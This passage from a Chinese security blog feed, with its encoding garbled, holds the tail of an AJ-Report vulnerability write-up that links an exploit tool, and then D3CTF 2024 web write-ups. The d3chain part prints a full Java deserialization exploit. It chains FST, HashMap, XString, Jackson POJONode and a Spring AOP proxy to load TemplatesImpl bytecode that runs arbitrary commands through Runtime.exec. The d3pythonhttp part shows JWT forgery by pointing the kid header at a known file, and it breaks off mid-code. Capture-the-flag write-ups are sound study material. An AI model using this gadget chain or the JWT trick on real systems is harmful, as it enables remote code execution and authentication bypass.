title="åˆ«çš„è·¯ç”±"></a>åˆ«çš„è·¯ç”±</h5><p>å…¶å®<code>/dataSet/testTransform</code>è·¯ç”±ä¹Ÿä¼šè°ƒç”¨åˆ°<code>engine.eval</code>ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ã€‚æœ‰å…´è¶£çš„å¸ˆå‚…å¯ä»¥çœ‹ä¸€ä¸‹ï¼Œè¿™ä¸ªæ¥å£çš„é€»è¾‘æ˜¯æ‰§è¡Œå®Œè¡¨è¾¾å¼å‘èµ·ä¸€ä¸ª<code>http</code>è¯·æ±‚ï¼Œè¿”å›çš„æ˜¯<code>http</code>çš„<code>response</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240510134204870.png" alt="image-20240510134204870"></p><h4 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h4><p>ä¸»è¦é—®é¢˜åœ¨é‰´æƒè€Œä¸æ˜¯ <code>engine.eval</code> ï¼Œ åº”è¯¥ä½¿ç”¨ <code>reqeust.getServletPath()</code> è·å– <code>URI</code>ï¼Œæˆ–è€…å¹²è„†æŠŠ <code>swagger-ui</code> æ”¾è¡Œé€»è¾‘é‚£é‡Œåˆ æ‰ã€‚</p><p>å…¶æ¬¡éœ€è¦ä¿®æ”¹<code>jwt</code>é»˜è®¤å¯†é’¥ã€‚</p><h4 id="åˆ©ç”¨å·¥å…·"><a href="#åˆ©ç”¨å·¥å…·" class="headerlink" title="åˆ©ç”¨å·¥å…·"></a>åˆ©ç”¨å·¥å…·</h4><p><a href="https://github.com/yuebusao/AJ-REPORT-EXPLOIT">https://github.com/yuebusao/AJ-REPORT-EXPLOIT</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
            <tag> å®‰å…¨ç ”ç©¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D3CTF 2024 WEB</title>
      <link href="/2024/04/28/d3ctf2024/"/>
      <url>/2024/04/28/d3ctf2024/</url>
      
        <content type="html"><![CDATA[<h4 id="d3chain"><a href="#d3chain" class="headerlink" title="d3chain"></a>d3chain</h4><p>å†™å®Œä¸€çœ‹é¢˜æ²¡äº†ï¼Œä¸è¿‡å°±æ˜¯ä¸€ä¸ªå°ç­¾åˆ°ã€‚</p><p><code>FST</code>ååºåˆ—åŒ–ï¼Œæ²¡è§è¿‡ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/backdoor"</span><span class="token punctuation">)</span><span class="token keyword">public</span> Object <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> String data<span class="token punctuation">)</span> <span class="token punctuation">{</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    FSTConfiguration conf <span class="token operator">=</span> FSTConfiguration<span class="token punctuation">.</span><span class="token function">createDefaultConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> conf<span class="token punctuation">.</span><span class="token function">asObject</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€ç»ˆå®šä½åˆ°<code>instantiateAndReadWithSer</code>ï¼Œè°ƒç”¨ååºåˆ—åŒ–å™¨å¯¹åº”çš„<code>instantiate</code>è¿›è¡Œååºåˆ—åŒ–ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714319220103.png" alt="1714319220103"></p><p>ä¸ç¦æƒ³åˆ°äº†<code>hessian</code>ï¼Œè¿™é‡Œæœç„¶æœ‰å¯¹åº”çš„ååºåˆ—åŒ–å™¨<code>FSTMapSerializer</code>ï¼Œä¼šè°ƒç”¨<code>put</code>ä½œä¸º<code>start gadget</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714319274307.png" alt="1714319274307"></p><p>äºæ˜¯æƒ³åˆ°äº†é€šè¿‡<code>HashMap</code>æ¯”è¾ƒ<code>key</code>ç›¸åŒæ—¶ä¼šè§¦å‘ä»»æ„ç±»çš„<code>equals</code>æ–¹æ³•ï¼Œé‚£ä¹ˆé€šè¿‡<code>XString#equals</code>è§¦å‘<code>POJONODE#toString</code>æ‰“<code>getter</code>å°±èƒ½<code>RCE</code>äº†ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714319461428.png" alt="1714319461428"></p><p><strong>exp:</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>d3<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>ObjectIdGenerator<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span>POJONode<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TransformerFactoryImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xpath<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>XString<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>nustaq<span class="token punctuation">.</span>serialization<span class="token punctuation">.</span>FSTConfiguration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>aop<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>AdvisedSupport<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>nustaq<span class="token punctuation">.</span>serialization<span class="token punctuation">.</span>FSTObjectOutput<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>Templates<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationHandler<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Proxy<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EXP</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        CtClass ctClass <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        CtMethod writeReplace <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"writeReplace"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">removeMethod</span><span class="token punctuation">(</span>writeReplace<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// å°†ä¿®æ”¹åçš„CtClassåŠ è½½è‡³å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ä¸­</span>        ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        POJONode node <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span><span class="token function">makeTemplatesImplAopProxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> <span class="token function">xString2</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteArrayOutputStream out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FSTObjectOutput fstObjectOutput <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FSTObjectOutput</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>        fstObjectOutput<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        fstObjectOutput<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String data <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>out<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        FSTConfiguration conf <span class="token operator">=</span> FSTConfiguration<span class="token punctuation">.</span><span class="token function">createDefaultConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conf<span class="token punctuation">.</span><span class="token function">asObject</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">makeTemplatesImplAopProxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        AdvisedSupport advisedSupport <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AdvisedSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object template <span class="token operator">=</span> template <span class="token operator">=</span> <span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        advisedSupport<span class="token punctuation">.</span><span class="token function">setTarget</span><span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor constructor <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>AdvisedSupport<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InvocationHandler handler <span class="token operator">=</span> <span class="token punctuation">(</span>InvocationHandler<span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>advisedSupport<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object proxy <span class="token operator">=</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>ClassLoader<span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Templates<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> proxy<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//HashMap#readObject-->HotSwappableTargetSource#equals-->xString#equals-->node#toString</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">xString2</span><span class="token punctuation">(</span>Object node<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        XString xString <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XString</span><span class="token punctuation">(</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectIdGenerator<span class="token punctuation">.</span>IdKey idKey1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectIdGenerator<span class="token punctuation">.</span>IdKey</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>xString<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectIdGenerator<span class="token punctuation">.</span>IdKey idKey2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectIdGenerator<span class="token punctuation">.</span>IdKey</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>idKey1<span class="token punctuation">,</span><span class="token string">"hashCode"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>idKey1<span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>idKey2<span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>idKey2<span class="token punctuation">,</span><span class="token string">"hashCode"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> map<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> TemplatesImpl <span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span><span class="token keyword">throws</span> CannotCompileException<span class="token punctuation">,</span> NotFoundException<span class="token punctuation">,</span> IOException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchFieldException<span class="token punctuation">{</span>        ClassPool pool <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        CtClass cc <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"SOTA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//æœ¬æœºæµ‹è¯•</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cmd<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>            cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime.getRuntime().exec("</span><span class="token operator">+</span>cmd<span class="token operator">+</span><span class="token string">");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//        System.out.println("java.lang.Runtime.getRuntime().exec("+cmd+");");</span>        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cc<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> targetByteCodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>classBytes<span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//è¡¥å……å®ä¾‹åŒ–æ–°å»ºç±»æ‰€éœ€çš„æ¡ä»¶</span>        TemplatesImpl templates <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> targetByteCodes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"Squirtle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_class"</span><span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> templates<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span>Object obj1<span class="token punctuation">,</span>String str<span class="token punctuation">,</span>Object obj2<span class="token punctuation">)</span> <span class="token keyword">throws</span> NoSuchFieldException<span class="token punctuation">,</span> IllegalAccessException <span class="token punctuation">{</span>        Field field2 <span class="token operator">=</span> obj1<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è·å–PriorityQueueçš„comparatorå­—æ®µ</span>        field2<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//æš´åŠ›åå°„</span>        field2<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj1<span class="token punctuation">,</span> obj2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è®¾ç½®queueçš„comparatorå­—æ®µå€¼ä¸ºcomparator</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="d3pythonhttp"><a href="#d3pythonhttp" class="headerlink" title="d3pythonhttp"></a>d3pythonhttp</h4><p>ç¬¬ä¸€æ­¥ä¼ªé€ <code>jwt</code>ã€‚</p><pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        user_info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"isadmin"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">}</span>        key <span class="token operator">=</span> get_key<span class="token punctuation">(</span><span class="token string">"frontend_key"</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>user_info<span class="token punctuation">,</span> key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"HS256"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"kid"</span><span class="token punctuation">:</span> <span class="token string">"frontend_key"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> code<span class="token operator">=</span><span class="token number">302</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>        <span class="token keyword">return</span> resp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>login_form<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_key</span><span class="token punctuation">(</span>kid<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token string">""</span>    dir <span class="token operator">=</span> <span class="token string">"/app/"</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span>dir<span class="token operator">+</span>kid<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            key <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    <span class="token keyword">return</span> key<span class="token keyword">def</span> <span class="token function">verify_token</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    header <span class="token operator">=</span> jwt<span class="token punctuation">.</span>get_unverified_header<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    kid <span class="token operator">=</span> header<span class="token punctuation">[</span><span class="token string">"kid"</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> get_key<span class="token punctuation">(</span>kid<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> key<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"HS256"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæ˜¯å–<code>header</code>ä¸­çš„<code>kid</code>ä½œä¸º<code>header</code>ä½œä¸º<code>key</code>ï¼Œ<code>kid</code>å¯æ§æ‰€ä»¥è¯»ä¸€ä¸ªæœ¬åœ°å’Œè¿œç¨‹å†…å®¹ç›¸åŒçš„æ–‡ä»¶ä½œä¸º<code>key</code>å°±è¡Œäº†ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¸€è‡´çš„å°±æ˜¯<code>app.py</code>ã€‚</p><pre><code>headers = &#123;    &quot;kid&quot;: &quot;app.py&quot;&#125;kid = &quot;./app.py&quot;key = open(kid, &quot;r&quot;).read()user_info = &#123;&quot;username&quot;: &quot;admin&quot;, 